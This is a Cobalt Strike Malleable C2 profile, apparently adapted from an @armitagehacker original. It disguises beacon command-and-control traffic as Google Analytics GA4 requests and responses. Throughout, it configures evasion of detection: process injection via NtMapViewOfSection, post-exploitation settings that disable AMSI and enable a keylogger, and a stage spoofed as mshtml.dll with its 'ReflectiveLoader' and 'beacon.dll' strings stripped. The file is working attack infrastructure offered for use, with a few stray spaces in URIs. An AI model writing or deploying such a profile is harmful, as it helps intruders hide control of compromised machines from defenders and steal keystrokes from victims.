

```python
# Enhanced Google Analytics C2 Profile
# Mimics modern Google Analytics (GA4) traffic patterns
# Based on original work by @armitagehacker
# Enhanced for better OPSEC and evasion

set sleeptime "5000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

set host_stage "false";

# DNS Beacon configuration
dns-beacon {
    set dns_idle "8.8.8.8";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_ttl "1";
    set maxdns "235";
    set dns_stager_prepend "";
    set dns_stager_subhost ". stage.123456.";
}

http-get {
    set uri "/g/collect /analytics. js /gtag/js";
    
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
        header "Referer" "https://www.google.com/";
        header "Connection" "keep-alive";
        
        # Modern GA4 parameters
        parameter "v" "2";
        parameter "tid" "G-XXXXXXXXXX";
        parameter "_p" "1234567890";
        parameter "cid" "1234567890.1234567890";
        parameter "ul" "en-us";
        parameter "sr" "1920x1080";
        parameter "sd" "24-bit";
        parameter "_s" "1";
        parameter "dl" "https://www.example.com/";
        parameter "dt" "Example Domain";
        parameter "de" "UTF-8";
        
        metadata {
            base64url;
            prepend "sid=";
            parameter "sid";
        }
    }

    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        header "Pragma" "no-cache";
        header "Expires" "0";
        header "X-Content-Type-Options" "nosniff";
        header "Server" "gws";
        header "Alt-Svc" "h3=\":443\"; ma=2592000";

        output {
            # Return minimal valid JavaScript instead of GIF
            prepend "/*Google Analytics*/\nwindow.dataLayer=window.dataLayer||[];";
            append "\n//# sourceURL=gtag.js";
            base64url;
            print;
        }
    }
}

http-post {
    set uri "/g/collect /j/collect /analytics/collect";
    set verb "POST";
    
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
        header "Content-Type" "text/plain;charset=UTF-8";
        header "Origin" "https://www.example.com";
        header "Referer" "https://www.example.com/";
        header "Connection" "keep-alive";
        
        parameter "v" "2";
        parameter "tid" "G-XXXXXXXXXX";
        parameter "_p" "1234567890";
        parameter "cid" "1234567890.1234567890";
        
        id {
            base64url;
            prepend "en=page_view&_et=";
            parameter "_et";
        }

        output {
            base64url;
            prepend "ep. session_id=";
            print;
        }
    }

    server {
        header "Content-Type" "image/gif";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        header "Pragma" "no-cache"; 
        header "Expires" "Mon, 01 Jan 1990 00:00:00 GMT";
        header "Server" "gws";
        header "Alt-Svc" "h3=\":443\"; ma=2592000";

        output {
            # Valid 1x1 transparent GIF
            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
            print;
        }
    }
}

http-stager {
    set uri_x86 "/cm /pixel";
    set uri_x64 "/px. gif /beacon.gif";

    client {
        header "Accept" "image/webp,image/apng,image/*,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
        header "Referer" "https://www.google.com/";
        header "Connection" "keep-alive";
        
        parameter "v" "1";
        parameter "t" "pageview";
    }
    
    server {
        header "Content-Type" "image/gif";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        header "Server" "gws";
        
        output {
            print;
        }
    }
}

# Process injection configuration
process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "16700";
    set startrwx  "false";
    set userwx    "false";
    
    transform-x86 {
        prepend "\x90\x90";
    }
    
    transform-x64 {
        prepend "\x90\x90";
    }
    
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
    set thread_hint "ntdll!RtlUserThreadStart";
    set pipename "msagent_11";
    
    transform-x86 {
        prepend "\x90\x90";
        strrep "This program cannot be run in DOS mode" "";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
    }
    
    transform-x64 {
        prepend "\x90\x90";
        strrep "This program cannot be run in DOS mode" "";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
    }
}

# Stage encoding
stage {
    set checksum       "0";
    set compile_time   "14 Jul 2009 8:14:00";
    set entry_point    "170000";
    set image_size_x86 "512000";
    set image_size_x64 "512000";
    set name           "mshtml.dll";
    set userwx         "false";
    set cleanup        "true";
    set sleep_mask     "true";
    set stomppe        "true";
    set obfuscate      "true";
    set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26";
    
    transform-x86 {
        strrep "This program cannot be run in DOS mode" "";
        strrep "ReflectiveLoader" "";
    }
    
    transform-x64 {
        strrep "This program cannot be run in DOS mode" "";
        strrep "ReflectiveLoader" "";
    }
    
    stringw "Microsoft Corporation";
}

# SMB Beacon configuration
set pipename "msagent_11";
set pipename_stager "status_11";
set ssh_banner "OpenSSH_8.9p1 Ubuntu-3ubuntu0.1";
set ssh_pipename "SearchTextHarvester11";


```



# Default

```

```






